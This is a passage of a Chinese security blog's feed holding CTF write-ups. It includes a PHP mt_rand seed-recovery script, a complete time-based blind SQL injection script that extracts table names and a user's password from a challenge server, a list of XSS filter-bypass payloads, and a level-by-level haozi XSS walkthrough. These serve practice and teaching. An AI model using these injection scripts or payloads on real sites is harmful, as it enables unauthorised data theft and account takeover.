"""</span></span><br><span class="line">    s1 ^= (s1 &gt;&gt; <span class="number">11</span>)</span><br><span class="line">    s1 ^= (s1 &lt;&lt; <span class="number">7</span>) &amp; <span class="number">0x9d2c5680</span></span><br><span class="line">    s1 ^= (s1 &lt;&lt; <span class="number">15</span>) &amp; <span class="number">0xefc60000</span></span><br><span class="line">    s1 ^= (s1 &gt;&gt; <span class="number">18</span>)</span><br><span class="line">    <span class="keyword">return</span> s1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">undo_php_mt_rand</span><span class="params">(s1)</span>:</span></span><br><span class="line">    <span class="string">"""Retrieves the merged state value from the value sent to the user.</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    s1 ^= (s1 &gt;&gt; <span class="number">18</span>)</span><br><span class="line">    s1 ^= (s1 &lt;&lt; <span class="number">15</span>) &amp; <span class="number">0xefc60000</span></span><br><span class="line"></span><br><span class="line">    s1 = undo_lshift_xor_mask(s1, <span class="number">7</span>, <span class="number">0x9d2c5680</span>)</span><br><span class="line"></span><br><span class="line">    s1 ^= s1 &gt;&gt; <span class="number">11</span></span><br><span class="line">    s1 ^= s1 &gt;&gt; <span class="number">22</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> s1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">undo_lshift_xor_mask</span><span class="params">(v, shift, mask)</span>:</span></span><br><span class="line">    <span class="string">"""r s.t. v = r ^ ((r &lt;&lt; shift) &amp; mask)</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(shift, <span class="number">32</span>, shift):</span><br><span class="line">        v ^= (bits(v, i - shift, shift) &amp; bits(mask, i, shift)) &lt;&lt; i</span><br><span class="line">    <span class="keyword">return</span> v</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bits</span><span class="params">(v, start, size)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> lobits(v &gt;&gt; start, size)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lobits</span><span class="params">(v, b)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> v &amp; ((<span class="number">1</span> &lt;&lt; b) - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bit</span><span class="params">(v, b)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> v &amp; (<span class="number">1</span> &lt;&lt; b)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bv</span><span class="params">(v, b)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> bit(v, b) &gt;&gt; b</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">php_mt_reload</span><span class="params">(state, flavour)</span>:</span></span><br><span class="line">    s = state</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, N - M):</span><br><span class="line">        s[i] = _twist_php(s[i + M], s[i], s[i + <span class="number">1</span>], flavour)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(N - M, N - <span class="number">1</span>):</span><br><span class="line">        s[i] = _twist_php(s[i + M - N], s[i], s[i + <span class="number">1</span>], flavour)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_twist_php</span><span class="params">(m, u, v, flavour)</span>:</span></span><br><span class="line">    <span class="string">"""Emulates the `twist` and `twist_php` #defines.</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    mask = <span class="number">0x9908b0df</span> <span class="keyword">if</span> (u <span class="keyword">if</span> flavour == MT_RAND_PHP <span class="keyword">else</span> v) &amp; <span class="number">1</span> <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">return</span> m ^ (((u &amp; <span class="number">0x80000000</span>) | (v &amp; <span class="number">0x7FFFFFFF</span>)) &gt;&gt; <span class="number">1</span>) ^ mask</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">undo_php_mt_reload</span><span class="params">(S000, S227, offset, flavour)</span>:</span></span><br><span class="line">    <span class="comment"># define twist_php(m,u,v)  (m ^ (mixBits(u,v)&gt;&gt;1) ^ ((uint32_t)(-(int32_t)(loBit(u))) &amp; 0x9908b0dfU))</span></span><br><span class="line">    <span class="comment"># m S000</span></span><br><span class="line">    <span class="comment"># u S227</span></span><br><span class="line">    <span class="comment"># v S228</span></span><br><span class="line">    X = S000 ^ S227</span><br><span class="line"></span><br><span class="line">    <span class="comment"># This means the mask was applied, and as such that S227's LSB is 1</span></span><br><span class="line">    s22X_0 = bv(X, <span class="number">31</span>)</span><br><span class="line">    <span class="comment"># remove mask if present</span></span><br><span class="line">    <span class="keyword">if</span> s22X_0:</span><br><span class="line">        X ^= <span class="number">0x9908b0df</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Another easy guess</span></span><br><span class="line">    s227_31 = bv(X, <span class="number">30</span>)</span><br><span class="line">    <span class="comment"># remove bit if present</span></span><br><span class="line">    <span class="keyword">if</span> s227_31:</span><br><span class="line">        X ^= <span class="number">1</span> &lt;&lt; <span class="number">30</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># We're missing bit 0 and bit 31 here, so we have to try every possibility</span></span><br><span class="line">    s228_1_30 = (X &lt;&lt; <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">for</span> s228_0 <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">        <span class="keyword">for</span> s228_31 <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">            <span class="keyword">if</span> flavour == MT_RAND_MT19937 <span class="keyword">and</span> s22X_0 != s228_0:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            s228 = s228_0 | s228_31 &lt;&lt; <span class="number">31</span> | s228_1_30</span><br><span class="line"></span><br><span class="line">            <span class="comment"># Check if the results are consistent with the known bits of s227</span></span><br><span class="line">            s227 = _undo_php_mt_initialize(s228, <span class="number">228</span> + offset)</span><br><span class="line">            <span class="keyword">if</span> flavour == MT_RAND_PHP <span class="keyword">and</span> bv(s227, <span class="number">0</span>) != s22X_0:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">if</span> bv(s227, <span class="number">31</span>) != s227_31:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># Check if the guessed seed yields S000 as its first scrambled state</span></span><br><span class="line">            rand = undo_php_mt_initialize(s228, <span class="number">228</span> + offset)</span><br><span class="line">            state = php_mt_initialize(rand)</span><br><span class="line">            php_mt_reload(state, flavour)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> (S000 == state[offset]):</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> rand</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(_R000, _R227, offset, flavour)</span>:</span></span><br><span class="line">    <span class="comment"># Both were &gt;&gt; 1, so the leftmost byte is unknown</span></span><br><span class="line">    _R000 &lt;&lt;= <span class="number">1</span></span><br><span class="line">    _R227 &lt;&lt;= <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> R000_0 <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">        <span class="keyword">for</span> R227_0 <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">            R000 = _R000 | R000_0</span><br><span class="line">            R227 = _R227 | R227_0</span><br><span class="line">            S000 = undo_php_mt_rand(R000)</span><br><span class="line">            S227 = undo_php_mt_rand(R227)</span><br><span class="line">            seed = undo_php_mt_reload(S000, S227, offset, flavour)</span><br><span class="line">            <span class="keyword">if</span> seed:</span><br><span class="line">                <span class="keyword">return</span> seed</span><br></pre></td></tr></table></figure><p><code>exp.py</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">from reverse_mt_rand import main</span><br><span class="line">url = &apos;https://twoshot.hgame.n3ko.co&apos;</span><br><span class="line">r = requests.Session()</span><br><span class="line">random_num = r.get(url + &apos;/random.php?times=229&apos;).text</span><br><span class="line">random_num = eval(random_num)</span><br><span class="line">first_arg = random_num[0]</span><br><span class="line">second_arg = random_num[227]</span><br><span class="line">third_arg = 0</span><br><span class="line">end_arg = 0</span><br><span class="line">result = main(first_arg,second_arg,third_arg,end_arg)</span><br><span class="line">print(r.post(url=url+&quot;/verify.php&quot;,data=&#123;&quot;ans&quot;: str(result)&#125;).text)</span><br></pre></td></tr></table></figure><p>运行<code>exp.py</code>即可得到flag</p><h2 id="Cosmos的留言板-2"><a href="#Cosmos的留言板-2" class="headerlink" title="Cosmos的留言板-2"></a>Cosmos的留言板-2</h2><p>这里是比较简单的延时盲注，几乎没有任何过滤，用二分法即可跑出来，脚本如下</p><p><code>exp.py</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">url = <span class="string">'http://139.199.182.61:19999/index.php?method=delete&amp;delete_id='</span></span><br><span class="line">headers = &#123;<span class="string">'Cookie'</span>: <span class="string">'PHPSESSID=q80egc37cuo61j1ftstcc25ej9'</span>&#125;</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_message</span><span class="params">()</span>:</span></span><br><span class="line">    url = <span class="string">'http://139.199.182.61:19999/index.php?method=send'</span></span><br><span class="line">    html = requests.post(url=url, data=&#123;<span class="string">'message'</span>: <span class="string">'1'</span>&#125;, headers=headers).text</span><br><span class="line">    <span class="keyword">return</span> max(re.findall(<span class="string">r"&lt;a href=.+method=delete&amp;delete_id=(.+)'&gt;"</span>,html))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">binary_search_sql</span><span class="params">(start,end,payload,length=<span class="number">2</span>)</span>:</span></span><br><span class="line">    name = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,length+<span class="number">1</span>):</span><br><span class="line">        left = start</span><br><span class="line">        right = end</span><br><span class="line">        <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">            mid = (left + right) // <span class="number">2</span></span><br><span class="line">            <span class="keyword">if</span> mid == left:</span><br><span class="line">                name += chr(mid)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            start_time = time.time()</span><br><span class="line">            full_payload = payload.format(id=create_message(),num1=str(i),num2=str(mid))</span><br><span class="line">            requests.get(url=url+full_payload,headers=headers)</span><br><span class="line">            print(full_payload)</span><br><span class="line">            <span class="keyword">if</span> time.time() - start_time &gt; <span class="number">2.5</span>:</span><br><span class="line">                right = mid</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                left = mid</span><br><span class="line">    <span class="keyword">return</span> name</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这里爆破库名长度</span></span><br><span class="line"><span class="comment"># 7</span></span><br><span class="line">database_length_payload = <span class="string">"&#123;id&#125; and if(ascii(mid(length(database()),&#123;num1&#125;,1))&lt;&#123;num2&#125;,sleep(3),1)"</span></span><br><span class="line">database_length = binary_search_sql(<span class="number">48</span>,<span class="number">57</span>,database_length_payload,<span class="number">1</span>)</span><br><span class="line">print(<span class="string">'database_length:'</span>+database_length)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这里爆破库名</span></span><br><span class="line"><span class="comment"># babysql</span></span><br><span class="line">database_payload = <span class="string">"&#123;id&#125; and if(ascii(mid((database()),&#123;num1&#125;,1))&lt;&#123;num2&#125;,sleep(3),1)"</span></span><br><span class="line">print(<span class="string">'database_name:'</span>+binary_search_sql(<span class="number">33</span>,<span class="number">127</span>,database_payload,<span class="number">7</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这里爆破表名长度</span></span><br><span class="line"><span class="comment"># 13</span></span><br><span class="line">table_length_payload = <span class="string">"&#123;id&#125; and if((ascii(mid((length((select group_concat(table_name) from information_schema.tables where table_schema=database()))),&#123;num1&#125;,1))&lt;&#123;num2&#125;),sleep(3),1)"</span></span><br><span class="line">table_length = binary_search_sql(<span class="number">48</span>,<span class="number">57</span>,table_length_payload)</span><br><span class="line">print(<span class="string">'table_length:'</span>+table_length)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这里爆破表名</span></span><br><span class="line"><span class="comment"># messages,user</span></span><br><span class="line">table_name_payload = <span class="string">"&#123;id&#125; and if((ascii(mid(((select group_concat(table_name) from information_schema.tables where table_schema=database())),&#123;num1&#125;,1))&lt;&#123;num2&#125;),sleep(3),1)"</span></span><br><span class="line">print(<span class="string">'table_name:'</span>+binary_search_sql(<span class="number">33</span>,<span class="number">127</span>,table_name_payload,int(table_length)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这里爆破messages表下的字段长度</span></span><br><span class="line"><span class="comment"># 26</span></span><br><span class="line">column_length_payload = <span class="string">'&#123;id&#125; and if((ascii(mid(length((select group_concat(column_name) from information_schema.columns where table_name=0x6D65737361676573)),&#123;num1&#125;,1)) &lt;&#123;num2&#125;),sleep(3),1)'</span></span><br><span class="line">column_length = binary_search_sql(<span class="number">48</span>,<span class="number">57</span>,column_length_payload)</span><br><span class="line">print(<span class="string">'column_length:'</span>+column_length)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这里爆破messages表下的字段</span></span><br><span class="line"><span class="comment"># message_id,user_id,message</span></span><br><span class="line">column_name_payload = <span class="string">'&#123;id&#125; and if((ascii(mid(((select group_concat(column_name) from information_schema.columns where table_name=0x6D65737361676573)),&#123;num1&#125;,1))&lt;&#123;num2&#125;),sleep(3),1)'</span></span><br><span class="line">print(<span class="string">'column_name:'</span>+binary_search_sql(<span class="number">33</span>,<span class="number">127</span>,column_name_payload,int(column_length)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这里爆破user表下的字段长度</span></span><br><span class="line"><span class="comment"># 16</span></span><br><span class="line">column2_length_payload = <span class="string">'&#123;id&#125; and if((ascii(mid(length((select group_concat(column_name) from information_schema.columns where table_name=0x75736572)),&#123;num1&#125;,1)) &lt;&#123;num2&#125;),sleep(3),1)'</span></span><br><span class="line">column2_length = binary_search_sql(<span class="number">48</span>,<span class="number">57</span>,column2_length_payload)</span><br><span class="line">print(<span class="string">'column_length:'</span>+column2_length)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这里爆破user表下的字段</span></span><br><span class="line"><span class="comment"># id,name,password</span></span><br><span class="line">column2_name_payload = <span class="string">'&#123;id&#125; and if((ascii(mid(((select group_concat(column_name) from information_schema.columns where table_name=0x75736572)),&#123;num1&#125;,1))&lt;&#123;num2&#125;),sleep(3),1)'</span></span><br><span class="line">print(<span class="string">'column_name:'</span>+binary_search_sql(<span class="number">33</span>,<span class="number">127</span>,column2_name_payload,int(column2_length)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这里爆破user表下的数据长度</span></span><br><span class="line"><span class="comment"># 28</span></span><br><span class="line">data_user_length_payload = <span class="string">'&#123;id&#125; and if((ascii(mid(length((select password from babysql.user where name=\'cosmos\')),&#123;num1&#125;,1))&lt;&#123;num2&#125;),sleep(3),1)'</span></span><br><span class="line">data_user_length = binary_search_sql(<span class="number">48</span>,<span class="number">57</span>,data_user_length_payload)</span><br><span class="line">print(<span class="string">'data_user_length:'</span>+data_user_length)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这里爆破user表下的数据</span></span><br><span class="line">data_user_payload = <span class="string">'&#123;id&#125; and if((ascii(mid((select password from babysql.user where name=\'cosmos\'),&#123;num1&#125;,1))&lt;&#123;num2&#125;),sleep(3),1)'</span></span><br><span class="line">print(<span class="string">'data_user:'</span>+binary_search_sql(<span class="number">33</span>,<span class="number">127</span>,data_user_payload,int(data_user_length)))</span><br></pre></td></tr></table></figure><p>然后得到<code>cosmos</code>的密码，登录即可得到flag</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;hgame2020-Level-Week3_Web_writeup&lt;/p&gt;
    
    </summary>
    
      <category term="CTF" scheme="http://0clickjacking0.github.io/categories/CTF/"/>
    
    
  </entry>
  
  <entry>
    <title>xss攻击时bypass的一些总结</title>
    <link href="http://0clickjacking0.github.io/2020/02/02/xss%E6%94%BB%E5%87%BB%E6%97%B6bypass%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/"/>
    <id>http://0clickjacking0.github.io/2020/02/02/xss攻击时bypass的一些总结/</id>
    <published>2020-02-02T13:02:45.000Z</published>
    <updated>2020-02-03T05:50:24.474Z</updated>
    
    <content type="html"><![CDATA[<a id="more"></a><h1 id="过滤"><a href="#过滤" class="headerlink" title="过滤()"></a>过滤()</h1><h3 id="html编码绕过"><a href="#html编码绕过" class="headerlink" title="html编码绕过"></a>html编码绕过</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=1 onerror=alert&amp;#40;1&amp;#41;&gt;</span><br></pre></td></tr></table></figure><h3 id="使用-绕过"><a href="#使用-绕过" class="headerlink" title="使用`绕过"></a>使用`绕过</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=x onerror=alert`1`&gt;</span><br></pre></td></tr></table></figure><p>### </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;h1 id=&quot;过滤&quot;&gt;&lt;a href=&quot;#过滤&quot; class=&quot;headerlink&quot; title=&quot;过滤()&quot;&gt;&lt;/a&gt;过滤()&lt;/h1&gt;&lt;h3 id=&quot;html编码绕过&quot;&gt;&lt;a href=&quot;#html编码绕过&quot; class=&quot;header
      
    
    </summary>
    
      <category term="Web Security" scheme="http://0clickjacking0.github.io/categories/Web-Security/"/>
    
    
  </entry>
  
  <entry>
    <title>haozi xss刷题记录</title>
    <link href="http://0clickjacking0.github.io/2020/02/02/haozi-xss%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    <id>http://0clickjacking0.github.io/2020/02/02/haozi-xss刷题记录/</id>
    <published>2020-02-02T08:21:23.000Z</published>
    <updated>2020-05-19T08:28:07.998Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://xss.haozi.me/" target="_blank" rel="noopener">题目平台</a></p><p><a href="https://github.com/haozi/xss-demo" target="_blank" rel="noopener">项目地址</a></p><a id="more"></a><p>这里只需要能alert(1)即可通关，比较基础，可以练练手</p><h1 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h1><p>server code：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'&lt;div&gt;'</span> + input + <span class="string">'&lt;/div&gt;'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里没有任何过滤，直接可以进行xss</p><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure><h1 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h1><p>server code：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'&lt;textarea&gt;'</span> + input + <span class="string">'&lt;/textarea&gt;'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里没有任何过滤，闭合<code>&lt;textarea&gt;</code>标签即可直接可以进行xss</p><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;/textarea&gt;&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure><h1 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h1><p>server code：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'&lt;input type="name" value="'</span> + input + <span class="string">'"&gt;'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里有两种考虑的方法</p><h3 id="方法1"><a href="#方法1" class="headerlink" title="方法1"></a>方法1</h3><p>先闭合<code>value</code>的<code>&quot;</code>，然后在input标签中加载js事件，但是这个需要被攻击者配合，并不能直接加载</p><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; onmousemove= &quot;alert(1)&quot; &gt;&lt;!--&quot;&gt;</span><br></pre></td></tr></table></figure><h3 id="方法2"><a href="#方法2" class="headerlink" title="方法2"></a>方法2</h3><p>闭合input标签，直接使用<code>script</code>标签</p><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;!--</span><br></pre></td></tr></table></figure><h1 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h1><p>server code：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> stripBracketsRe = <span class="regexp">/[()]/g</span></span><br><span class="line">  input = input.replace(stripBracketsRe, <span class="string">''</span>)</span><br><span class="line">  <span class="keyword">return</span> input</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里过滤了<code>()</code>，可以使用<code>`</code></p><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert`1`&lt;/script&gt;</span><br></pre></td></tr></table></figure><h1 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h1><p>server code：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function render (input) &#123;</span><br><span class="line">  const stripBracketsRe = /[()`]/g</span><br><span class="line">  input = input.replace(stripBracketsRe, &apos;&apos;)</span><br><span class="line">  return input</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里过滤了<code>[]</code>、<code>()</code>、<code>`</code>，可以用html编码绕过</p><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=1 onerror=alert&amp;#40;1&amp;#41;&gt;</span><br></pre></td></tr></table></figure><h1 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h1><p>server code：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  input = input.replace(<span class="regexp">/--&gt;/g</span>, <span class="string">'😂'</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'&lt;!-- '</span> + input + <span class="string">' --&gt;'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的考点就是html中的注释，如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//               单行注释</span><br><span class="line">&lt;!-- --!&gt;        注释多行内容</span><br><span class="line">&lt;!-- --&gt;         注释多行内容</span><br><span class="line">&lt;-- --&gt;          注释多行内容</span><br><span class="line">&lt;-- --！&gt;        注释多行内容</span><br><span class="line">--&gt;              单行注释后面内容</span><br><span class="line">/* */            多行注释</span><br><span class="line">有时还可以利用浏览器的容错性，不需要注释</span><br></pre></td></tr></table></figure><p>虽然这里过滤了<code>--&gt;</code>，但是还是可以用<code>--!&gt;</code>绕过</p><p>payload：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--!&gt;<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="0x06"><a href="#0x06" class="headerlink" title="0x06"></a>0x06</h1><p>server code：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  input = input.replace(<span class="regexp">/auto|on.*=|&gt;/ig</span>, <span class="string">'_'</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`&lt;input value=1 <span class="subst">$&#123;input&#125;</span> type="text"&gt;`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里正则过滤时有一个漏洞，即它是匹配<code>on****=</code>整体，所以我们只需要在<code>=</code>前面换行即可</p><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">type=&quot;image&quot; src=x onerror</span><br><span class="line">        =&quot;alert(1)&quot;</span><br></pre></td></tr></table></figure><h1 id="0x07"><a href="#0x07" class="headerlink" title="0x07"></a>0x07</h1><p>server code：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> stripTagsRe = <span class="regexp">/&lt;\/?[^&gt;]+&gt;/gi</span></span><br><span class="line"></span><br><span class="line">  input = input.replace(stripTagsRe, <span class="string">''</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`&lt;article&gt;<span class="subst">$&#123;input&#125;</span>&lt;/article&gt;`</span></span><br><span 